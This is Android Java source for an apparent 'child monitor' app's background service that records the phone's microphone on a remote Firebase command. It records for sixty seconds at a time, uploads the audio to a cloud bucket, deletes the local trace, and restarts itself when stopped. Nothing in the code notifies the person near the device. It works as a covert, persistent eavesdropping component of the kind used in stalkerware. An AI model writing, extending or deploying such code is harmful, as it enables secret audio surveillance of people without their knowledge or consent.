package com.childmonitor.services;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class SurroundingSoundService extends Service {

    private MediaRecorder recorder;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isRecording = false;
    private String deviceId;
    private DatabaseReference commandRef;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = getSharedPreferences("cm_prefs", MODE_PRIVATE)
                .getString("device_id", "unknown");
        commandRef = FirebaseDatabase.getInstance()
                .getReference("devices").child(deviceId).child("commands").child("record_sound");
        commandRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snap) {
                Boolean val = snap.getValue(Boolean.class);
                if (val != null && val && !isRecording) startRecording();
                else if (val != null && !val && isRecording) stopRecording();
            }
            @Override
            public void onCancelled(DatabaseError e) {}
        });
    }

    private void startRecording() {
        try {
            isRecording = true;
            File out = new File(getCacheDir(), "snd_" + System.currentTimeMillis() + ".3gp");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(out.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { stopAndUpload(out); }
            }, 60000);
        } catch (Exception e) {
            isRecording = false;
        }
    }

    private void stopRecording() {
        if (recorder != null) {
            try { recorder.stop(); recorder.release(); } catch (Exception ignored) {}
            recorder = null;
        }
        isRecording = false;
    }

    private void stopAndUpload(File file) {
        if (!isRecording) return;
        stopRecording();
        if (!file.exists()) return;
        StorageReference ref = FirebaseStorage.getInstance().getReference()
                .child("devices").child(deviceId).child("recordings").child(file.getName());
        ref.putFile(android.net.Uri.fromFile(file))
           .addOnSuccessListener(t -> ref.getDownloadUrl().addOnSuccessListener(uri -> {
               Map<String, Object> d = new HashMap<>();
               d.put("url", uri.toString());
               d.put("timestamp", System.currentTimeMillis());
               FirebaseDatabase.getInstance().getReference("devices")
                       .child(deviceId).child("recordings")
                       .child(String.valueOf(System.currentTimeMillis())).setValue(d);
               file.delete();
           }))
           .addOnFailureListener(e -> file.delete());
        commandRef.setValue(false);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
        startService(new Intent(this, SurroundingSoundService.class));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
